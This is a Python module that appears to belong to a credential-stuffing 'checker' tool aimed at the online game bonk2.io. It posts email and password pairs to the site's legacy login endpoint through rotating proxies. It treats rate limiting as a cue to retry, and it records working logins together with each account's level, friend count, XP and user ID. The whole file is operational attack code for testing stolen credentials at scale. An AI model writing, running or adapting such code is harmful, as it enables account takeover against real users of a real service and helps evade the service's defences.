from __main__ import checker
from modules.functions import set_proxy,log,save
from requests import post
from math import sqrt

def check(email:str,password:str):
    retries = 0
    
    if "@" in email:
        email = email.split("@")[0]
    
    while retries != checker.retries:
        proxy = set_proxy()
        headers = {
            "Content-Type": "application/x-www-form-urlencoded"
        }
        data = f"username={email}&password={password}"
        try:
            a = post("https://bonk2.io/scripts/login_legacy.php",data=data,headers=headers,proxies=set_proxy(proxy),timeout=checker.timeout).json()
            if a["r"] == "fail":
                if a.get("e"):
                    if a["e"] == "ratelimited":
                        raise
                retries += 1
            elif "xp" in a:
                xp = a["xp"]
                friends = len(a["friends"])
                leg_friends = a.get("legacyFriends")
                if leg_friends:
                    try:
                        friends += len(leg_friends.split("#"))
                    except:
                        pass
                user_id = a["id"]
                if int(xp) != 0:
                    level = int(sqrt(int(xp)/100))
                else:
                    level = 0
                if not checker.cui:
                    log("good",email+":"+password,"Bonk.io")
                save("BonkIO","good",checker.time,email+":"+password+f" | Level: {level} | Friends: {friends} | Xp: {xp} | UserID: {user_id}")
                checker.good += 1
                checker.cpm += 1
                return
        except:
            checker.errors += 1
    checker.bad += 1
    checker.cpm += 1
    return
